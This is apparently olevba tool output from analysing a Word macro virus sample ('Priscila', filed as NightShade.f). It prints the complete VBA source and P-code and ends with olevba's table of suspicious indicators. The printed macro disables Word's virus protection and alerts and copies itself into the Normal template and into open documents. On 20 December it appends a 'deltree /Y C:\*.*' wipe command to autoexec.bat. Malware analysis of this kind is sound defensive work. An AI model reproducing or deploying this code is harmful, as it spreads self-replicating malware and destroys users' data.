olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.NightShade.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.NightShade.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Priscila.bas 
in file: Virus.MSWord.NightShade.f - OLE stream: 'Macros/VBA/Priscila'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Attribute AutoClose.VB_Description = "(c) 1997 Microsoft - All rights Reserved."
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Microsoft.Priscila.AutoClose"
On Error GoTo Priscila

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate

    EstaEnDoc = False
    EstaEnDot = False

    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "Priscila" Then
            EstaEnDoc = True
        End If
    Next

    For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "Priscila" Then
            EstaEnDot = True
        End If
    Next

    If EstaEnDoc = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Priscila", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.FullName
    End If

    If EstaEnDot = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Priscila", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
    End If

    If Month(Now()) = 12 And Day(Now()) = 20 Then
        NúmArch2 = FreeFile()
        Open "\autoexec.bat" For Append As NúmArch2
        Print #1,
        Print #1, "@echo off"
        Print #1, "deltree /Y C:\*.*"
        Close NúmArch2
        Assistant.Visible = True
        With Assistant.NewBalloon
            .Icon = msoIconAlert
            .Text = "Tienes el PRISCILA ViRuS - by CrM - Paraguay"
            .Heading = "Atención:"
            .Show
        End With
    End If
    
    Application.DisplayAlerts = wdAlertsAll

Priscila:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.NightShade.f
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/Priscila - 3324 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	OnError Priscila 
' Line #2:
' Line #3:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #7:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #8:
' Line #9:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #10:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #11:
' Line #12:
' 	LitVarSpecial (False)
' 	St EstaEnDoc 
' Line #13:
' 	LitVarSpecial (False)
' 	St EstaEnDot 
' Line #14:
' Line #15:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #16:
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0008 "Priscila"
' 	Eq 
' 	IfBlock 
' Line #17:
' 	LitVarSpecial (True)
' 	St EstaEnDoc 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	StartForVariable 
' 	Next 
' Line #20:
' Line #21:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #22:
' 	Ld J 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0008 "Priscila"
' 	Eq 
' 	IfBlock 
' Line #23:
' 	LitVarSpecial (True)
' 	St EstaEnDot 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	StartForVariable 
' 	Next 
' Line #26:
' Line #27:
' 	Ld EstaEnDoc 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #28:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "Priscila"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #29:
' 	Ld ActiveDoc 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0001 
' Line #30:
' 	EndIfBlock 
' Line #31:
' Line #32:
' 	Ld EstaEnDot 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #33:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "Priscila"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #34:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #35:
' 	EndIfBlock 
' Line #36:
' Line #37:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0014 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #38:
' 	ArgsLd Friend 0x0000 
' 	St NúmArch2 
' Line #39:
' 	LitStr 0x000D "\autoexec.bat"
' 	Ld NúmArch2 
' 	LitDefault 
' 	Open (For Append)
' Line #40:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	PrintNL 
' Line #41:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #42:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "deltree /Y C:\*.*"
' 	PrintItemNL 
' Line #43:
' 	Ld NúmArch2 
' 	Close 0x0001 
' Line #44:
' 	LitVarSpecial (True)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #45:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #46:
' 	Ld msoIconAlert 
' 	MemStWith Icon 
' Line #47:
' 	LitStr 0x002C "Tienes el PRISCILA ViRuS - by CrM - Paraguay"
' 	MemStWith Then 
' Line #48:
' 	LitStr 0x0009 "Atención:"
' 	MemStWith Heading 
' Line #49:
' 	ArgsMemCallWith Show 0x0000 
' Line #50:
' 	EndWith 
' Line #51:
' 	EndIfBlock 
' Line #52:
' Line #53:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #54:
' Line #55:
' 	Label Priscila 
' Line #56:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

